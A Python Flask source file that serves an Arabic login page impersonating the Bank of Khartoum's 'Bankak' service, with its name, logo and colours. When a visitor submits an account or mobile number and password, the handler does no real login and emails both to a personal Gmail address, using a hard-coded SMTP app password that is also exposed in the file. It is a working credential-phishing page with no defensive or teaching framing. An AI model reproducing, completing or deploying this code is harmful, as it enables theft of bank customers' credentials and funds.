from flask import Flask, render_template_string, request
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# قالب HTML المعدل
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ff0000; /* خلفية حمراء للصفحة */
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #d50000;
            padding: 20px;
            color: white;
        }
        .header h1 {
            margin: 0;
            font-size: 3em;
        }
        .header h2 {
            margin: 0;
            font-size: 1.5em; /* إعادة حجم كلمة bankak إلى الحجم الأصلي */
        }
        .header .dark-green {
            color: #008000; /* لون أخضر غامق */
        }
        .form-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 400px;
            margin: 20px auto;
            background-color: #ff0000; /* خلفية حمراء للحقول */
        }
        input[type="text"], input[type="password"] {
            padding: 10px;
            margin: 10px 0;
            width: calc(100% - 22px); /* لتناسب العرض مع الزر */
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1.2em;
            background-color: #ffcccc; /* خلفية الحقول باللون الأحمر الفاتح */
        }
        button {
            padding: 10px;
            background-color: #d50000;
            color: white;
            border: none;
            cursor: pointer;
            width: 100%;
            border-radius: 5px;
            font-size: 1.2em;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            font-size: 1em;
        }
        .icons {
            margin-top: 30px;
            display: flex;
            justify-content: center;
        }
        .icon {
            display: inline-block;
            margin: 0 15px;
            text-align: center;
        }
        .icon img {
            width: 50px;
        }
        .footer-icons {
            background-color: white;
            padding: 10px;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-around;
            border-top: 1px solid #ccc;
        }
        .footer-icons img {
            width: 40px;
        }
        .footer-icons p {
            margin: 5px 0 0;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1><span class="dark-green">ب</span>نكك</h1> <!-- تلوين الحرف ب -->
        <h2><span class="dark-green">b</span>ankak</h2> <!-- تلوين الحرف b -->
    </div>

    <div class="form-container">
        <form method="POST">
            <input type="text" name="account_number" placeholder="أدخل رقم الحساب أو رقم الموبايل" required>
            <br>
            <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
            <br>
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="links">
            <a href="#">تسجيل جديد؟</a>
            <a href="#">لا تستطيع تسجيل الدخول؟</a>
        </div>
    </div>

    <div class="footer-icons">
        <div class="icon">
            <img src="https://tullaab.com/wp-content/uploads/2022/07/%D8%AA%D9%86%D8%B4%D9%8A%D8%B7-%D8%AD%D8%B3%D8%A7%D8%A8-%D8%A8%D9%86%D9%83-%D8%A7%D9%84%D8%AE%D8%B1%D8%B7%D9%88%D9%85-%D8%B4%D8%B1%D8%AD-%D8%A8%D8%A7%D8%A7%D9%84%D8%AA%D9%81%D8%B5%D9%8A%D9%84.jpg" alt="بنك الخرطوم">
            <p>بنك الخرطوم</p>
        </div>
        <div class="icon">
            <img src="https://www.freeiconspng.com/thumbs/maps-icon/maps-icon-11.png" alt="المساعدة">
            <p>مواقعنا</p>
        </div>
        <div class="icon">
            <img src="https://shoebox.co.uk/wp-content/uploads/2021/05/phone-icon.png" alt="مواقعنا">
            <p>المساعدة</p>
        </div>
        <div class="icon">
            <img src="https://th.bing.com/th/id/OIP.CxN1ZFXY3FBfpfiNDGcdwgAAAA?rs=1&pid=ImgDetMain" alt="فيس بوك">
            <p>فيس بوك</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    message = ""
    if request.method == 'POST':
        account_number = request.form['account_number']
        password = request.form['password']
        
        # هنا يمكنك إضافة منطق للتحقق من الحساب وكلمة المرور
        
        # إرسال المعلومات إلى البريد الإلكتروني
        send_email(account_number, password)
        message = "تم إرسال معلومات تسجيل الدخول إلى البريد الإلكتروني!"
        
    return render_template_string(HTML_TEMPLATE, message=message)

def send_email(account_number, password):
    # إعدادات البريد الإلكتروني
    sender_email = "abdallihabdalazem12@gmail.com"  # بريدك الإلكتروني
    receiver_email = "abdallihabdalazem12@gmail.com"  # البريد الإلكتروني الذي ستستقبل فيه المعلومات
    subject = "معلومات تسجيل الدخول"
    body = f"رقم الحساب: {account_number}\nكلمة المرور: {password}"
    
    # إنشاء رسالة البريد الإلكتروني
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # إرسال البريد الإلكتروني
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, "pxllassgfqqyejgh")  # كلمة مرور التطبيق هنا
        server.sendmail(sender_email, receiver_email, msg.as_string())

if __name__ == '__main__':
    app.run(debug=True)



